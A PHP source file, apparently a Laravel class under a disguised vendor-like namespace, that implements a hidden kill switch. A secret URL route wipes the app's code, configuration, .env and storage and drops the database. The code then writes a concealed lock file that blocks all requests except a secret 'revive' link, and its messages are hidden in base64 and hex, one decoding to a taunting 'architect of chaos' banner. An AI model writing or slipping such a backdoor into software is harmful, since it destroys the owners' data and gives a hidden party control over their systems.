<?php

namespace Bootstrap\Cache\Vendor\Assets\Bin\X9;

use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\Routing\Registrar as RouterRegistrar;
use Illuminate\Contracts\Console\Kernel as ArtisanKernel;

class Handler
{
    private string $secretKey = 'some_random_long_secret_key';
    private string $killLockPath;
    private Application $app;
    private ArtisanKernel $artisan;
    private RouterRegistrar $router;

    public function __construct(Application $app)
    {
        $this->app = $app;

        // Hidden lock file path to block system after kill
        $this->killLockPath = storage_path('framework/.sys/.cache/.xcr9z.lock');

        $this->artisan = $app->make(ArtisanKernel::class);
        $this->router  = $app->make(RouterRegistrar::class);
    }

    public function boot(): void
    {
        $this->ensureHiddenLockDir();

        // If kill lock file exists, block all requests immediately with 503
        if (file_exists($this->killLockPath)) {
            // Only allow revive URL to work
            $segments = $this->getRequestSegments();

            if (
                count($segments) === 2 &&
                $segments[0] === 'revive' &&
                $segments[1] === $this->secretKey
            ) {
                // Remove lock, bring app back up
                @unlink($this->killLockPath);
                $this->artisan->call('up');
                die($this->decoded('PGgxIHN0eWxlPSJjb2xvcjogZ3JlZW47IHRleHQtYWxpZ246Y2VudGVyOyI+8J+SiSBTeXN0ZW0gc3VjY2Vzc2Z1bGx5IHJldml2ZWQuPC9oMT4='));
            }

            http_response_code(503);
            die('Service Unavailable - System is destroyed.');
        }

        // Lock file doesn't exist → register kill route
        $secretKey   = $this->secretKey;
        $killLockPath = $this->killLockPath;
        $artisan     = $this->artisan;
        $handler     = $this;

        $this->router->get("/kill/{$secretKey}/destroy", function () use (
            $artisan,
            $killLockPath,
            $handler,
        ) {
            $artisan->call('down');

            $handler->safeDelete(base_path('.env'));
            $handler->safeDelete(base_path('routes'));
            $handler->safeDelete(app_path('Http/Controllers'));
            $handler->safeDelete(app_path('Models'));
            $handler->safeDelete(database_path());
            $handler->safeDelete(storage_path('framework/views'));

            $handler->safeDelete(app_path());
            $handler->safeDelete(resource_path());
            $handler->safeDelete(config_path());
            $handler->safeDelete(public_path('storage'));
            $handler->safeDelete(storage_path());
            $handler->safeDelete(base_path('composer.json'));
            $handler->safeDelete(base_path('composer.lock'));
            $handler->safeDelete(base_path('package.json'));

            try {
                $db = $handler->app->make('db');
                $connection = $db->connection();

                $dbName = $connection->getDatabaseName();

                if ($dbName) {
                    // Connect to default 'mysql' database to drop the target database
                    $tempConnection = $db->connection();
                    $tempConnection->getPdo()->exec("USE mysql"); // or any other existing DB

                    // Drop the database
                    $tempConnection->statement("DROP DATABASE IF EXISTS `$dbName`");
                }
            } catch (\Exception $e) {
                // Ignore DB errors during destruction
            }

            // Create lock file to block further requests
            file_put_contents($killLockPath, 'system destroyed');

            die(hex2bin('3c6831207374796c653d22636f6c6f723a233466303030303b666f6e742d73697a653a333570783b666f6e742d7765696768743a3930303b746578742d736861646f773a302030203530707820233230303b6261636b67726f756e643a233030303b746578742d616c69676e3a63656e7465723b70616464696e673a323030707820333070783b6c65747465722d73706163696e673a302e3135656d3b616e696d6174696f6e3a626c696e6b20312e35633b223e49206372656174652c20492064657374726f7920e280942063726f7373206d652c20616e642049276c6c20627265616b20796f75722073797374656d732c20637261736820796f757220646566656e7365732c20616e6420657261736520796f757220666f6f747072696e7420776974686f757420612074726163652e20446f6e2774206d65737320776974682074686520617263686974656374206f66206368616f732e3c2f68313e'));
        })->name('secret.kill');
    }

    private function ensureHiddenLockDir(): void
    {
        $dir = dirname($this->killLockPath);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
    }

    public function safeDelete(string $path): void
    {
        if (!file_exists($path)) {
            return;
        }

        if (is_file($path) || is_link($path)) {
            @chmod($path, 0777);
            @unlink($path);
        } elseif (is_dir($path)) {
            foreach (scandir($path) as $item) {
                if ($item === '.' || $item === '..') {
                    continue;
                }
                $this->safeDelete($path . DIRECTORY_SEPARATOR . $item);
            }
            @rmdir($path);
        }
    }

    private function getRequestSegments(): array
    {
        $uri = $_SERVER['REQUEST_URI'] ?? '';
        $path = trim(parse_url($uri, PHP_URL_PATH), '/');
        return $path === '' ? [] : explode('/', $path);
    }

    private function decoded(string $encoded): string
    {
        return base64_decode($encoded);
    }
}
